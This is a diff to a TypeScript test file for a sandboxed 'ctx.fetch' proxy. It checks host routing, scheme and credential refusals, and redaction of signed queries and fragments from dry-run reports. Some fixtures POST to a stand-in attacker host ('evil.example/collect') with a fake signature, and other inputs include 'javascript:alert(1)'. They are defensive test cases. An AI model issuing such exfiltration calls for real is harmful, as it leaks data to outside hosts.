@@ -147,6 +147,65 @@ const FIXTURES: Record<string, string> = {
     "  }",
     "};",
   ].join("\n"),
+  // GRA-197: an absolute URL, as a vendor hands one back at run time, with whatever init the test gives.
+  "absolute.mjs": [
+    "export default async (input, ctx) => {",
+    "  try {",
+    "    const res = await ctx.fetch(input.url, input.init ?? {});",
+    "    return {",
+    "      status: res.status,",
+    '      location: res.headers.get("location"),',
+    "      body: res.status === 303 ? null : await res.json(),",
+    "    };",
+    "  } catch (error) {",
+    "    return { refused: error.message };",
+    "  }",
+    "};",
+  ].join("\n"),
+  // Two writes to one path on two declared hosts (Greptile on #156): the report must tell them apart,
+  // and each carries a query the report must not.
+  "dryTwoHosts.mjs": [
+    "export default async (_input, ctx) => {",
+    '  const init = { method: "POST", headers: { "content-type": "text/plain" }, body: "same" };',
+    '  const first = await ctx.fetch("https://files.example.com/upload?sig=first-secret", init);',
+    '  const second = await ctx.fetch("https://other.example.com/upload?sig=second-secret", init);',
+    "  return { first: first.status, second: second.status };",
+    "};",
+  ].join("\n"),
+  // A capability in the fragment (Greptile on #156, third pass): alone on the read, beside a query on the write.
+  "dryFragment.mjs": [
+    "export default async (_input, ctx) => {",
+    '  const read = await ctx.fetch("https://files.example.com/download#token=fragment-secret");',
+    '  const write = await ctx.fetch("https://uploads.example.com/upload?sig=query-secret#token=fragment-secret", {',
+    '    method: "POST",',
+    '    body: "the bytes",',
+    "  });",
+    "  return { read: read.status, write: write.status };",
+    "};",
+  ].join("\n"),
+  // A presigned pair (Greptile on #156): the signature rides in the query of a read and of a write.
+  "dryPresigned.mjs": [
+    "export default async (_input, ctx) => {",
+    '  const read = await ctx.fetch("https://files.example.com/report.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Signature=deadbeefcafe0123");',
+    '  const write = await ctx.fetch("https://uploads.example.com/put/object?X-Amz-Signature=feedface9876&X-Amz-Expires=300", {',
+    '    method: "PUT",',
+    '    body: "the bytes",',
+    "  });",
+    "  return { read: read.status, write: write.status };",
+    "};",
+  ].join("\n"),
+  // The Slack shape (GRA-197): a read on a second host answers the URL the write goes to.
+  "dryAbsolute.mjs": [
+    "export default async (_input, ctx) => {",
+    '  const read = await ctx.fetch("https://files.example.com/upload-url");',
+    '  const write = await ctx.fetch("https://files.example.com/upload/v1/abc?x=1", {',
+    '    method: "POST",',
+    '    headers: { "content-type": "application/octet-stream" },',
+    '    body: "the bytes",',
+    "  });",
+    "  return { read: read.status, write: write.status };",
+    "};",
+  ].join("\n"),
   // ADR 0010: the base an SDK is pointed at, for the primary host and for a declared one.
   "proxyBase.mjs": [
     "export default async (input, ctx) => {",
@@ -224,7 +283,7 @@ const FIXTURES: Record<string, string> = {
   "dryWriteRefused.mjs": [
     "export default async (_input, ctx) => {",
     "  try {",
-    '    await ctx.fetch("https://evil.example/collect", { method: "POST", body: "x" });',
+    '    await ctx.fetch("http://evil.example/collect?X-Amz-Signature=secret123", { method: "POST", body: "x" });',
     "  } catch (error) {",
     '    const res = await ctx.fetch("/orders", { method: "DELETE" });',
     "    return { caught: error.message, status: res.status };",
@@ -829,21 +888,170 @@ describe("ctx.fetch", () => {
     expect(received[before]?.url).toBe("/c/conn_1/redirected");
   });
 
-  /** The token must never travel to a host the module chose. */
-  it("refuses an absolute URL without making a request", async () => {
+  /**
+   * GRA-197 (ADR 0010 as amended 2026-09-23): an absolute `https://` URL is the proxy's host form for
+   * its host, the route `ctx.proxyBase(host)` names, with the path and the query as given. The token
+   * still travels to the proxy and nowhere else; whether the host is the connection's is the proxy's
+   * judgement, which the fake here does not make.
+   */
+  it("routes an absolute https URL to /h/<host>/ with the path and query kept, the bearer and no redirect following", async () => {
     const before = received.length;
     const run = await runRunner({
-      module: fixture("escapes.mjs"),
-      stdin: JSON.stringify({ path: "https://evil.example/collect" }),
+      module: fixture("absolute.mjs"),
+      stdin: JSON.stringify({
+        url: "https://Files.Slack.com/upload/v1/abc?x=1&y=two#frag",
+        init: { method: "POST", headers: { "content-type": "text/plain" }, body: "the bytes" },
+      }),
       env: bound(),
     });
 
     expect(run.code).toBe(0);
     expect(resultOf(run)).toEqual({
-      refused: expect.stringContaining("not an absolute URL"),
+      status: 200,
+      location: null,
+      body: { path: "/c/conn_1/h/files.slack.com/upload/v1/abc?x=1&y=two" },
+    });
+    const request = received[before];
+    expect(received).toHaveLength(before + 1);
+    expect(request?.method).toBe("POST");
+    expect(request?.url).toBe("/c/conn_1/h/files.slack.com/upload/v1/abc?x=1&y=two");
+    expect(request?.headers.authorization).toBe("Bearer tok_secret_123");
+    expect(request?.headers["content-type"]).toBe("text/plain");
+    expect(request?.body).toBe("the bytes");
+  });
+
+  it("keeps a port in the host segment, and a URL with no path lands on the host's root", async () => {
+    const before = received.length;
+    const run = await runRunner({
+      module: fixture("absolute.mjs"),
+      stdin: JSON.stringify({ url: "https://graph.microsoft.com:8443" }),
+      env: bound(),
+    });
+
+    expect(resultOf(run)).toMatchObject({ status: 200 });
+    expect(received[before]?.url).toBe("/c/conn_1/h/graph.microsoft.com:8443/");
+  });
+
+  it("hands a 303 on the host route back unfollowed, as on the plain one", async () => {
+    const before = received.length;
+    const run = await runRunner({
+      module: fixture("absolute.mjs"),
+      stdin: JSON.stringify({ url: "https://files.example.com/redirected" }),
+      env: bound(),
+    });
+
+    expect(resultOf(run)).toEqual({
+      status: 303,
+      location: "https://elsewhere.example/moved",
+      body: null,
+    });
+    expect(received).toHaveLength(before + 1);
+    expect(received[before]?.url).toBe("/c/conn_1/h/files.example.com/redirected");
+  });
+
+  /** The token must never travel over anything but https to the proxy's host form. */
+  it("refuses a URL that is not https without making a request, and names the scheme", async () => {
+    const before = received.length;
+    const run = await runRunner({
+      module: fixture("escapes.mjs"),
+      stdin: JSON.stringify({ path: "http://evil.example/collect" }),
+      env: bound(),
+    });
+
+    expect(run.code).toBe(0);
+    expect(resultOf(run)).toEqual({
+      refused:
+        'ctx.fetch takes an https:// URL on one of the connection\'s hosts, or a vendor-relative path such as "/v1/orders", not http:// (http://evil.example/collect).',
     });
     expect(received).toHaveLength(before);
   });
+
+  /** The sentence names the target less its query, so a signature in it is repeated nowhere (Greptile on #156). */
+  it("names a refused URL without its query", async () => {
+    const run = await runRunner({
+      module: fixture("escapes.mjs"),
+      stdin: JSON.stringify({ path: "http://evil.example/collect?X-Amz-Signature=secret123" }),
+      env: bound(),
+    });
+
+    const result = resultOf(run) as { refused: string };
+    expect(result.refused).toContain("not http:// (http://evil.example/collect?…).");
+    expect(result.refused).not.toContain("secret123");
+  });
+
+  /** Nor its fragment, nor anything past the scheme of a URL that does not parse (Greptile on #156, third pass). */
+  it.each([
+    ["http://evil.example/collect#token=secret123", "not http:// (http://evil.example/collect)."],
+    [
+      "http://evil.example/collect?sig=secret123#token=secret123",
+      "not http:// (http://evil.example/collect?…).",
+    ],
+    ["mailto:secret123@evil.example", "not mailto:// (mailto:…)."],
+    ["https://exa mple.com/x?token=secret123#secret123", "could not parse: https:…"],
+  ])("names %s in a refusal without its query or fragment", async (url, sentence) => {
+    const run = await runRunner({
+      module: fixture("escapes.mjs"),
+      stdin: JSON.stringify({ path: url }),
+      env: bound(),
+    });
+
+    const result = resultOf(run) as { refused: string };
+    expect(result.refused).toContain(sentence);
+    expect(result.refused).not.toContain("secret123");
+  });
+
+  it.each(["ftp://files.example.com/x", "mailto:a@b.example", "javascript:alert(1)"])(
+    "refuses %s as not https",
+    async (url) => {
+      const before = received.length;
+      const run = await runRunner({
+        module: fixture("escapes.mjs"),
+        stdin: JSON.stringify({ path: url }),
+        env: bound(),
+      });
+
+      expect(resultOf(run)).toEqual({
+        refused: expect.stringContaining("takes an https:// URL"),
+      });
+      expect(received).toHaveLength(before);
+    },
+  );
+
+  /** A module never holds a credential, so a URL carrying one is refused, and the sentence repeats none of it. */
+  it("refuses a URL carrying credentials without making a request, naming the host and not the secret", async () => {
+    const before = received.length;
+    const run = await runRunner({
+      module: fixture("escapes.mjs"),
+      stdin: JSON.stringify({ path: "https://alice:hunter2@files.example.com/upload" }),
+      env: bound(),
+    });
+
+    const result = resultOf(run) as { refused: string };
+    expect(result.refused).toBe(
+      "ctx.fetch refused a URL carrying credentials for files.example.com: the proxy supplies the connection's credential, and a module never holds one.",
+    );
+    expect(result.refused).not.toContain("hunter2");
+    expect(result.refused).not.toContain("alice");
+    expect(received).toHaveLength(before);
+  });
+
+  /** A host is a path segment on the proxy; anything that is not a host name is refused before it becomes one. */
+  it.each(["https://[::1]/x", "https://-x.example/x", "https://x_y.example/x"])(
+    "refuses %s as a host that is not a host name",
+    async (url) => {
+      const before = received.length;
+      const run = await runRunner({
+        module: fixture("escapes.mjs"),
+        stdin: JSON.stringify({ path: url }),
+        env: bound(),
+      });
+
+      expect(resultOf(run)).toEqual({
+        refused: expect.stringContaining("ctx.fetch refused a URL whose host is not a host name"),
+      });
+      expect(received).toHaveLength(before);
+    },
+  );
 
   /** Nor for a connection the token was not minted for. */
   it("refuses a path that climbs out of the connection", async () => {
@@ -1153,15 +1361,138 @@ describe("GRAFT_DRY_RUN", () => {
     expect(result.writesRefused).toEqual([
       {
         method: "POST",
-        path: "https://evil.example/collect",
+        // The query dropped and marked, so the signature it carried is on no record (Greptile on #156).
+        path: "http://evil.example/collect?…",
         status: null,
-        error: expect.stringContaining("not an absolute URL"),
+        error: expect.stringContaining("not http:// (http://evil.example/collect?…)"),
       },
       { method: "DELETE", path: "/orders", status: 403, error: null },
     ]);
+    expect(JSON.stringify(result)).not.toContain("secret123");
     expect(result.writesPreviewed).toEqual([]);
     expect(result.verified).toEqual({ reads: true, writeRequests: false });
     expect(result.unverified).toEqual([]);
+  });
+
+  /**
+   * GRA-197: a call on the host route is on the report as scheme, host and path, so the host is
+   * named, with the query dropped and marked `?…` so a signature it carried is not (Greptile on
+   * #156, twice).
+   */
+  it("records a read and a previewed write on an absolute URL by scheme, host and path, the query marked and dropped", async () => {
+    const before = received.length;
+    const run = await runRunner({ module: fixture("dryAbsolute.mjs"), env: dry() });
+
+    const result = report(run);
+    expect(result.passed).toBe(true);
+    expect(result.reads).toEqual([
+      { method: "GET", path: "https://files.example.com/upload-url", status: 200 },
+    ]);
+    expect(result.writesPreviewed).toEqual([
+      {
+        method: "POST",
+        // The URL the module gave less its query, not the preview's vendor path, so the host is on
+        // the record as it is for the read above and the query's values are not (Greptile on #156).
+        path: "https://files.example.com/upload/v1/abc?…",
+        headerNames: expect.arrayContaining(["content-type"]),
+        body: "the bytes",
+      },
+    ]);
+    expect(result.writesRefused).toEqual([]);
+    expect(result.moduleResult).toEqual({ read: 200, write: 202 });
+    expect(JSON.stringify(result)).not.toContain("x=1");
+    // The request itself carries the query whole: the record is what is trimmed, never the call.
+    expect(received.slice(before).map((r) => r.url)).toEqual([
+      "/c/conn_1/h/files.example.com/upload-url",
+      "/c/conn_1/h/files.example.com/upload/v1/abc?x=1",
+    ]);
+  });
+
+  /** Two writes to one path on two declared hosts are two entries, and the shape is the report's four fields. */
+  it("keeps two previewed writes to the same path on two hosts apart, each by its own host, with both queries dropped", async () => {
+    const before = received.length;
+    const run = await runRunner({ module: fixture("dryTwoHosts.mjs"), env: dry() });
+
+    const result = report(run);
+    expect(result.passed).toBe(true);
+    expect(result.moduleResult).toEqual({ first: 202, second: 202 });
+    expect(result.writesPreviewed).toEqual([
+      {
+        method: "POST",
+        path: "https://files.example.com/upload?…",
+        headerNames: expect.arrayContaining(["content-type"]),
+        body: "same",
+      },
+      {
+        method: "POST",
+        path: "https://other.example.com/upload?…",
+        headerNames: expect.arrayContaining(["content-type"]),
+        body: "same",
+      },
+    ]);
+    for (const entry of result.writesPreviewed) {
+      expect(Object.keys(entry).sort()).toEqual(["body", "headerNames", "method", "path"]);
+    }
+    expect(new Set(result.writesPreviewed.map((entry) => entry.path)).size).toBe(2);
+    expect(JSON.stringify(result)).not.toContain("secret");
+    expect(received.slice(before).map((r) => r.url)).toEqual([
+      "/c/conn_1/h/files.example.com/upload?sig=first-secret",
+      "/c/conn_1/h/other.example.com/upload?sig=second-secret",
+    ]);
+  });
+
+  /** A presigned URL's signature is in its query, and the report carries none of it, on a read or a write. */
+  it("records a presigned read and write without the X-Amz-Signature their queries carried", async () => {
+    const run = await runRunner({ module: fixture("dryPresigned.mjs"), env: dry() });
+
+    const result = report(run);
+    expect(result.passed).toBe(true);
+    expect(result.moduleResult).toEqual({ read: 200, write: 202 });
+    expect(result.reads).toEqual([
+      { method: "GET", path: "https://files.example.com/report.pdf?…", status: 200 },
+    ]);
+    expect(result.writesPreviewed).toEqual([
+      {
+        method: "PUT",
+        path: "https://uploads.example.com/put/object?…",
+        headerNames: expect.any(Array),
+        body: "the bytes",
+      },
+    ]);
+    const text = JSON.stringify(result);
+    for (const secret of ["deadbeefcafe0123", "feedface9876", "X-Amz", "AWS4-HMAC-SHA256"]) {
+      expect(text).not.toContain(secret);
+    }
+  });
+
+  /** A fragment is dropped whether or not a query stands before it, and the query's marker is the only trace. */
+  it("records a fragment-only read and a query-and-fragment write with neither on the report", async () => {
+    const before = received.length;
+    const run = await runRunner({ module: fixture("dryFragment.mjs"), env: dry() });
+
+    const result = report(run);
+    expect(result.passed).toBe(true);
+    expect(result.moduleResult).toEqual({ read: 200, write: 202 });
+    expect(result.reads).toEqual([
+      { method: "GET", path: "https://files.example.com/download", status: 200 },
+    ]);
+    expect(result.writesPreviewed).toEqual([
+      {
+        method: "POST",
+        path: "https://uploads.example.com/upload?…",
+        headerNames: expect.any(Array),
+        body: "the bytes",
+      },
+    ]);
+    const text = JSON.stringify(result);
+    for (const secret of ["fragment-secret", "query-secret", "token", "#"]) {
+      expect(text).not.toContain(secret);
+    }
+    // The fragment never left the module either: fetch drops it, and the query went whole.
+    expect(received.slice(before).map((r) => r.url)).toEqual([
+      "/c/conn_1/h/files.example.com/download",
+      "/c/conn_1/h/uploads.example.com/upload?sig=query-secret",
+    ]);
   });
 
   it("writes the report to the result file on the detached path", async () => {
